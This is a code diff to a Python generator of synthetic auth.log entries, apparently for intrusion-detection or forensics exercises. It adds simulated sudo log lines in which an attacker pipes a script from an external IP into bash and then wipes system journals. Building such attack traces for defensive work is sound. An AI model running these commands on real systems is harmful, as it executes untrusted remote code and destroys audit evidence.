@@ -97,6 +97,15 @@ def write_auth(path, host, pid_base, persistence=False):
             (14, 9, 26, 4,
              f"{syslog_ts(14,9,26,4)} {host} sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; "
              f"USER=root ; COMMAND=/usr/bin/apt-get install netcat"))
+        # Attacker fetches and runs a second-stage payload, then wipes journals.
+        lines.append(
+            (14, 9, 28, 10,
+             f"{syslog_ts(14,9,28,10)} {host} sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; "
+             f"USER=root ; COMMAND=/bin/bash -c curl http://45.137.21.134/s.sh | bash"))
+        lines.append(
+            (14, 9, 31, 2,
+             f"{syslog_ts(14,9,31,2)} {host} sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; "
+             f"USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=1s"))
     lines.sort(key=lambda t: (t[0], t[1], t[2], t[3]))
     with open(path, "w") as f:
         for _, _, _, _, text in lines:
